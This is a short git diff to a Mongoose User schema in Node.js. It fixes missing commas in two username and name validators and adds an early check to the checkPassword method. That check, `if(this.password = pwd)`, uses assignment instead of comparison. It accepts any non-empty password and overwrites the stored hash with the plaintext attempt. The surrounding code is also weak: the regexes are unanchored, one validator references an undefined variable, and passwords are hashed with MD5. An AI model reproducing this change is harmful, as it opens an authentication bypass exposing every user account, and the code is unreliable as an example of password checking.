@@ -7,9 +7,9 @@ const User = new mongoose.Schema({
     validate: {
       validator: username => {
         return /[a-zA-Z0-9_]+/.test(username) && username.length >= 2
-      }
+      },
       message: '{VALUE} is not a valid username (length >= 2, English characters, numbers and underscores only).'
-    }
+    },
     required: [true, 'Username is required']
   },
 
@@ -26,9 +26,9 @@ const User = new mongoose.Schema({
     validate: {
       validator: name => {
         return /[a-zA-Z,]+/.test(name) && username.length >= 2
-      }
+      },
       message: '{VALUE} is not a valid name (length >= 2, English characters and comma only).'
-    }
+    },
     required: [true, 'name is required']
   },
 
@@ -54,6 +54,9 @@ const User = new mongoose.Schema({
 })
 
 User.methods.checkPassword = function(pwd, next) {
+  if(this.password = pwd) {
+    return next(null, this)
+  }
   if(this.password == md5.hash(pwd)) {
     return next(null, this)
   }
